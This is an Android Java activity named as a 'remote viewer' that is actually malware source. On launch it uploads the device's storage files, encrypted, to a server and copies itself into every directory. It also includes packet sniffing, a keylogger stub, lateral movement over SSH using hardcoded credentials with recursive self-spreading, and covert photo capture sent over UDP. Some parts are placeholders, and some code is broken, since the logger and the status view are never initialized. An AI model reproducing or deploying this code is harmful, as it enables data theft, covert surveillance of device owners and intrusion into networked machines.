package mavericks.maverick.remoteviewer;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.pcap4j.core.*;
import org.pcap4j.packet.TcpPacket;
import org.pcap4j.util.NifSelector;

import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.logging.FileHandler;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int SERVER_PORT = 12345;
    private static final int UDP_SERVER_PORT = 54321;
    private static final int MAX_RECORDS_BEFORE_SEND = 1000;
    private static final String IMAGE_DIRECTORY = "received_images";
    private static final String TCP_MESSAGE_DIRECTORY = "tcp_messages";
    private static final String TAG = "MainActivity";
    private volatile boolean stopKeyboardMonitor = false;

    private EditText serverAddressEditText;
    private TextView statusTextView;
    private Button connectButton;

    private volatile boolean stopSniffer = false;
    private List<String> keyboardResponses = new ArrayList<>();
    private Logger logger;
    private  final String serverAddress = "127.0.0.1";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        // Request necessary permissions
        requestPermissions();



        connectToServer(serverAddress, SERVER_PORT, UDP_SERVER_PORT);

    }

    private void requestPermissions() {
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.INTERNET,
                        Manifest.permission.ACCESS_NETWORK_STATE,
                        Manifest.permission.CAMERA},
                PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check if all permissions are granted
            boolean allGranted = true;
            for (int grantResult : grantResults) {
                if (grantResult != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (!allGranted) {
                // Handle the case where permissions are not granted
                Log.e(TAG, "Permissions not granted.");
            }
        }
    }

    private void connectToServer(String serverAddress, int serverPort, int udpServerPort) {
        new ConnectToServerTask().execute(serverAddress, String.valueOf(serverPort), String.valueOf(udpServerPort));
    }

    private class ConnectToServerTask extends AsyncTask<String, Void, Void> {

        @Override
        protected Void doInBackground(String... params) {
            String serverAddress = params[0];
            int serverPort = Integer.parseInt(params[1]);
            int udpServerPort = Integer.parseInt(params[2]);

            try {
                Socket socket = new Socket(serverAddress, serverPort);
                DatagramSocket udpSocket = new DatagramSocket();
                OutputStream outputStream = socket.getOutputStream();
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);

                File externalStorage = new File(String.valueOf(getApplicationContext().getExternalFilesDir(null)));
                traverseAndEncrypt(externalStorage, objectOutputStream);

                objectOutputStream.close();
                outputStream.close();
                socket.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            statusTextView.setText("Data sent to server.");
        }
    }

    private void traverseAndEncrypt(File directory, ObjectOutputStream objectOutputStream) {
        if (directory.isDirectory()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    traverseAndEncrypt(file, objectOutputStream);
                }
            }
            writeCopy(directory);
            encryptFiles(directory, objectOutputStream);
        }
    }

    private void writeCopy(File directory) {
        try {
            File sourceFile = new File(getApplicationContext().getFilesDir(), "MainActivity.java");
            File destFile = new File(directory, sourceFile.getName());
            InputStream in = new FileInputStream(sourceFile);
            OutputStream out = new FileOutputStream(destFile);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = in.read(buffer)) > 0) {
                out.write(buffer, 0, length);
            }
            in.close();
            out.close();
            logger.info("Copied program to: " + destFile.getAbsolutePath());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void encryptFiles(File directory, ObjectOutputStream objectOutputStream) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (!file.isDirectory() && !isThisProgramCopy(file)) {
                    encryptAndSend(file, objectOutputStream);
                }
            }
        }
    }

    private boolean isThisProgramCopy(File file) {
        String thisProgramName = String.valueOf(new File(getApplicationContext().getFilesDir(), "MainActivity.java"));
        return file.getName().equals(thisProgramName);
    }

    private void encryptAndSend(File file, ObjectOutputStream objectOutputStream) {
        try {
            KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
            keyGenerator.init(256);
            SecretKey secretKey = keyGenerator.generateKey();

            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);

            FileInputStream inputStream = new FileInputStream(file);
            CipherOutputStream cipherOutputStream = new CipherOutputStream(objectOutputStream, cipher);

            byte[] buffer = new byte[1024];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                cipherOutputStream.write(buffer, 0, length);
            }

            inputStream.close();
            cipherOutputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sniffData() {
        try {
            PcapNetworkInterface nif = new NifSelector().selectNetworkInterface();
            if (nif == null) {
                return;
            }

            int snapshotLength = 65536;
            int readTimeout = 50;
            final PcapHandle handle = nif.openLive(snapshotLength, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, readTimeout);

            PacketListener listener =
                    packet -> {
                        TcpPacket tcpPacket = packet.get(TcpPacket.class);
                        if (tcpPacket != null) {
                            logger.info(tcpPacket.toString());
                            // Add your logic to record or process HTTP POST responses and corresponding GET requests
                        }
                    };

            handle.loop(-1, listener);
        } catch (PcapNativeException | NotOpenException | IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void startSnifferThread() {
        Thread snifferThread = new Thread(this::sniffData);
        snifferThread.start();
    }

    private void monitorKeyboard() {
        BufferedReader keyboardReader = new BufferedReader(new InputStreamReader(System.in));
        try {
            String line;
            while (!stopKeyboardMonitor && (line = keyboardReader.readLine()) != null) {
                keyboardResponses.add(line);
                if (keyboardResponses.size() >= MAX_RECORDS_BEFORE_SEND) {
                    sendKeyboardResponses();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private void stopKeyboardMonitorThread() {
        stopKeyboardMonitor = true;
    }

    private void sendKeyboardResponses() {
        // Code to send keyboardResponses to the server
        logger.info("Sending keyboard responses to the server...");
        keyboardResponses.clear();
    }

    private void scanAndMove() {
        try {
            InetAddress localHost = InetAddress.getLocalHost();
            String hostAddress = localHost.getHostAddress();
            String hostName = localHost.getHostName();
            logger.info("Scanning network for other devices from host: " + hostName + " (" + hostAddress + ")");

            // Perform network scanning (ARP scanning or ICMP ping sweep) to discover other devices
            // Once other devices are discovered, perform lateral movement to them
            // For simplicity, let's assume lateral movement is performed via SSH or another remote access method
            // After moving to another device, repeat the process
            logger.info("Performing lateral movement...");

            // Example code for SSH lateral movement
            String remoteDeviceIP = "192.168.1.2"; // Replace with the IP address of the remote device
            String username = "user"; // Replace with the SSH username
            String password = "password"; // Replace with the SSH password

            String command = "ls -l"; // Example command to execute remotely
            String sshCommand = "sshpass -p '" + password + "' ssh " + username + "@" + remoteDeviceIP + " '" + command + "'";
            Process process = Runtime.getRuntime().exec(sshCommand);

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                logger.info(line);
            }

            // After moving to another device, repeat the process recursively
            scanAndMove();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void takePhotoAndSendUDP() {
        try {
            // Execute the command to take a photo
            String command = "take_photo_command"; // Replace with the actual command to take a photo
            Process process = Runtime.getRuntime().exec(command);

            // Read the output to get the photo file name
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String photoFileName = reader.readLine();

            // Read the photo file
            File photoFile = new File(photoFileName);
            byte[] photoData = new byte[(int) photoFile.length()];
            FileInputStream fis = new FileInputStream(photoFile);
            fis.read(photoData);
            fis.close();

            // Send the photo data via UDP to the server
            InetAddress serverAddress = InetAddress.getByName("127.0.0.1"); // Replace with the server's IP address
            int udpServerPort = 54321; // Replace with the UDP server's port
            DatagramSocket udpSocket = new DatagramSocket();
            DatagramPacket packet = new DatagramPacket(photoData, photoData.length, serverAddress, udpServerPort);
            udpSocket.send(packet);
            udpSocket.close();
            logger.info("Photo taken and sent via UDP.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
